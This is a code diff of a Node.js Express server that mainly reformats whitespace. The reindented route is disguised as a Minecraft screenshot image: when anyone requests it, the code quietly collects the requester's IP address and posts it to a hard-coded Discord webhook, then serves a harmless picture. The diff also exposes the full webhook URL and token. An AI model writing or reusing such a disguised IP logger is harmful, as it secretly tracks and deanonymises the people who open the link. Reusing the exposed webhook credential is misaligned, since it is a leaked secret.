@@ -14,7 +14,7 @@ var route_mudae = require('./routes/mudae.js');
 var route_royale = require('./routes/royale.js');
 require('dotenv').config();
 
-app.set('trust proxy',true); 
+app.set('trust proxy', true);
 app.use(express.static(path.join(__dirname, '')));
 
 connection = mysql2.createConnection({
@@ -52,24 +52,24 @@ app.get('/', (req, res) => {
 });
 
 app.get('/images/minecraft/screenshot_2021_03_08.png', function (req, res) {
-  console.log(req.connection.remoteAddress);
-  var ip = req.headers['x-forwarded-for'] || 
-     req.connection.remoteAddress || 
-     req.socket.remoteAddress ||
-     (req.connection.socket ? req.connection.socket.remoteAddress : null);
-  fetch("https://discord.com/api/webhooks/510787425186873365/TEIpBGgl5bw9u5LK5PWAkPL8XpSg4WUHr8DuRRHzDehZDraKiNX02-xd5CVJwUM2_GM0", {
-    method: 'post',
-    headers: {
-        'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-        username: 'SVT',
-        avatar_url: 'https://i.imgur.com/zEN5n0b.png',
-        content: ip,
-    })
+    console.log(req.connection.remoteAddress);
+    var ip = req.headers['x-forwarded-for'] ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    fetch("https://discord.com/api/webhooks/510787425186873365/TEIpBGgl5bw9u5LK5PWAkPL8XpSg4WUHr8DuRRHzDehZDraKiNX02-xd5CVJwUM2_GM0", {
+        method: 'post',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            username: 'SVT',
+            avatar_url: 'https://i.imgur.com/zEN5n0b.png',
+            content: ip,
+        })
 
-})
-  res.sendFile(__dirname + "/minecraft.png");
+    })
+    res.sendFile(__dirname + "/minecraft.png");
 });
 
 const hostname = '192.168.56.101';
